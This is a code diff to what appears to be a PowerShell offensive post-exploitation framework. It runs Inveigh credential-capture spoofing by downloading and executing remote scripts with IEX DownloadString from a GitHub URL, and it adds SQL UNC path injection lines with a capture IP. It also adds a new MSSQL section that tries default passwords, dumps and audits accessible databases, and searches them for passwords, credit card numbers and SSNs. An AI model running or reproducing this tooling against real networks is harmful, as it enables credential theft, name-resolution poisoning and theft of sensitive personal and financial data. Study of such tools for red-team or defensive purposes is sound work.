@@ -126,10 +126,12 @@ function Inveigh {
         if (isadmin)
         {
                 cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}'
+		#Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
         }
         else 
         {
                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}'
+	       #Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
         }
     }
     else
@@ -137,10 +139,12 @@ function Inveigh {
         if (isadmin)
         {
                 cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory $currentPath\;}'
+		#Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
         }
         else 
         {
                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory $currentPath\;}
+	       #Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12
         }
     }
 
@@ -546,7 +550,27 @@ function domainreconmodules
 	    	Write-Host -ForegroundColor Yellow 'Searching for MSSQL Server instances in the domain:'
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowerUpSQL.ps1')
 		Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\MSSQLServers.txt"
-		# Login functions / Exploitation functions follow.
+		
+		Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
+		$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
+		$Targets >> "$currentPath\DomainRecon\MSSQLServer_Accessible.txt"
+		$Targets.Instance >> "$currentPath\DomainRecon\MSSQLServer_AccessibleInstances.txt"
+		
+		Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
+		Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\DomainRecon\MSSQLServer_DefaultLogin.txt"
+		
+		Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
+		foreach ($line in $Targets.Instance)
+		{
+			Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\MSSQLServer_Accessible_DumpInformation.txt"
+			Invoke-SQLDumpInfo -Verbose -Instance $line
+			Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\DomainRecon\MSSQLServer_Accessible_Audit_$Targets.Computername.txt"
+			mkdir "$currentPath\DomainRecon\SQLInfoDumps"
+			$Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\MSSQLServer_Accessible_PotentialSensitiveData.txt" 
+		}
+		Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
+		move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
+		# XP_Cmdshell functions follow - maybe.
 	    }
 	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
